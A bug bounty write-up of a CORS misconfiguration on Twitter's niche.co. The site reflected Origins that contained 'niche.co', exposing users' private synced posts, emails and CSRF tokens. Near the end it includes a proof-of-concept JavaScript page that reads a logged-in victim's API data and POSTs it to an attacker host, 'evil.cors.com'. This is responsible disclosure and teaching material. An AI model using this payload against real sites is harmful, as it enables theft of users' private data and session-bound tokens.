---
layout: post
title:  "A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook & Instagram"
date:   2019-01-20
categories: BugBounty
---

![CORS-Header]({{site.baseurl}}/assets/bugbounty/twitter-cors/cors_header.png){:class="img-responsive"}

**S**o you might have reached here thinking it’s a big & complex hack but believe me it’s nothing. It’s a very simple misconfiguration of [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) on one of Twitter’s product called [niche](https://www.niche.co/).

For Understanding and exploiting CORS, read [this](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) awesome blog by [@albinowax](https://twitter.com/albinowax).

To give a little background of niche, it’s a platform for creators to increase their social media presence by sharing there work(Pics, videos and other stuff). So whats the important asset here :

**Creators Work** - Their Images & Videos.

Another great feature of niche is that you can sync your posts from different social media platforms like Facebook, Twitter, Instagram etc.

Isn’t that heaven for creators, all of their private work at single place.

If you noticed the word “private” in the above line, than you do think like a hacker. Yes, niche also syncs private posts from all these social platforms(It does ask while connecting your other social platforms during OAuth).

After seeing that, i knew it would be great if we can somehow see other users private posts from social media through niche. So i tried for doing horizontal privesc using IDOR n other stuff but no luck.

After going through request in burp history, i saw in response `“Access-Control-Allow-Origin: https://niche.co & Access-Control-Allow-Credentials: true"`.

So tried exploiting by sending custom Origin header in request and found that the server was only checking whether “//niche.co” was in Origin header.

So if **Origin**: *https://evil.co* , **Access-Control-Allow-Origin**: *https://niche.co*

But if **Origin**: *https://niche.co.evil.net*, **Access-Control-Allow-Origin**: *https://niche.co.evil.net*.


## That’s it!

![BOOM](https://media.giphy.com/media/mks5DcSGjhQ1a/giphy.gif)

![CORS-Misconfig]({{site.baseurl}}/assets/bugbounty/twitter-cors/twitter_cors_burp.png){:class="img-responsive"}
Quickly went to the page where all synced photos from other social media were fetched and that was vulnerable as well, basically whole site was vulnerable. It even had an api endpoint which i found using fuzzing and which wasn’t used in whole site(maybe for dev or legacy) and didn’t even had a documentation but it did displayed all the methods that can be used during hit n trial.

Combining vulnerable api and site, i can steal any information about the other users using CORS(Images, email id, bio, profile info, CSRF tokens etc).

So made a simple POC that looked like this:

```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
Hosted on domain **niche.co.evil.net**(locally) and when someone visits it and if they are logged in to niche, all of their sensitive info from niche.co will be forwarded to my domain.

That’s it, a simple CORS misconfig with big impact yet Twitter didn’t rewarded since niche domain wasn’t eligible for bounty(can’t argue).

But hey, Twitter HOF for few hours of work…..i’ll take it! When the [hackerone report](https://hackerone.com/reports/426147) was disclosed, many questioned why i did it for free? but at the end i know i learned a lot about CORS, same origin policy, how exactly it works on different browsers. It was a great learning experience and that’s what matters to me.

#### YOUR MONEY CAN BE INFLATED AWAY BUT YOUR KNOWLEDGE CANNOT.

If you found this post useful in anyway, make it useful for others as well by sharing. More coming.

Follow me on [twitter](https://twitter.com/nahoragg) for **InfoSec** related stuff.

Let's connect on [Linkedin](https://www.linkedin.com/in/rohanaggarwal13).